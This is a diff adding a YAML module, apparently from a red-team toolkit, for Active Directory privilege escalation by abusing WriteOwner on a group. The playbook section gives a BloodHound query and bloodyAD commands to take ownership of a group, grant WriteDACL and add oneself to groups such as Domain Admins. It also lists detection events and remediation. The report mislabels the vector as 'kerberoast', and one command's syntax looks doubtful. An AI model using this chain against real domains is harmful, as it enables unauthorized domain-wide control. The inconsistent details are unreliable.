@@ -1,0 +1,61 @@
+# WriteOwner on a group → take ownership → add self as member
+#
+# WriteOwner lets the operator change an object's owner attribute.
+# The new owner implicitly holds full control (WriteDACL by
+# default), so the pivot is: WriteOwner → SetOwner → grant self
+# WriteDACL → grant self AddMember → self-add. Every step of that
+# chain is one bloodyAD / powerview call.
+#
+# When the target group is high-value (Domain Admins, Enterprise
+# Admins, DnsAdmins, a delegated OU-admin group), the operator
+# lands in that group and inherits its rights immediately.
+technique: T1222.001
+name: BloodHound edge — WriteOwner on group → self-add
+tactic: [privilege-escalation]
+platform: [windows]
+key: adroute:writeowner-group
+ranking:
+  exploitability: medium
+  safety: config-change            # rewrites the group ACL twice + adds a member
+  detection: moderate               # event 4735 (group membership change) + 4738
+detect:
+  group_member: Domain Users
+execute:
+  command: |-
+    where bloodyAD.exe 2>nul & where powerview.ps1 2>nul & echo "WriteOwner route surfaced — see playbook"
+verify:
+  success: "WriteOwner"
+cleanup:
+  command: ""
+report:
+  vector_type: kerberoast
+  evidence: "on a domain (Domain Users); WriteOwner route worth checking in BloodHound"
+  description: >
+    A principal you own may hold WriteOwner on a high-value group
+    (directly or transitively). The chain is: SetOwner → grant
+    self WriteDACL → grant self AddMember → self-add. Each step
+    is a single ldap/samr call. When the target is a DA-adjacent
+    group (Domain Admins, DnsAdmins, a delegated OU-admin), the
+    operator inherits the group's rights on self-add.
+  remediation: >
+    Restrict WriteOwner on privileged groups to tier-0 accounts.
+    Adminsdholder + AdminSDHolder inheritance restore this
+    hourly for protected groups — verify AdminSDHolder is
+    intact. Monitor for owner changes on privileged groups
+    (event 5136 with the owner attribute + object class = group).
+  refs: [T1222.001, WriteOwner, bloodhound]
+playbook:
+  summary: >
+    Domain foothold — check BloodHound for WriteOwner edges to
+    high-value groups. If a chain reaches a DA-adjacent group,
+    the SetOwner → WriteDACL → AddMember sequence takes seconds.
+  place: 'attacker-side (bloodyAD + powerview)'
+  steps:
+    - "in BloodHound: MATCH p=shortestPath((u:User {owned:true})-[r:MemberOf|WriteOwner*1..]->(g:Group))-[:MemberOf*1..]->(:Group {highvalue:true}) RETURN p"
+    - "pick a target group G reachable via WriteOwner"
+    - "SetOwner: `bloodyAD -d CORP.LOCAL -u <owned-user> -p <pass> --host <dc> set owner <G> <owned-user>`"
+    - "add self WriteDACL: `bloodyAD ... add rightRDN <G> <owned-user> WriteDACL`"
+    - "add self to the group: `bloodyAD ... add groupMember <G> <owned-user>`"
+    - "confirm membership: `net group <G> /domain` (should list your user)"
+    - "CLEANUP: remove self from the group (`bloodyAD ... remove groupMember <G> <owned-user>`) and restore the original owner (BloodHound shows this in the pre-exploit view)"
+  restore: "bloodyAD ... remove groupMember <G> <owned-user>; bloodyAD ... set owner <G> <original-owner>"
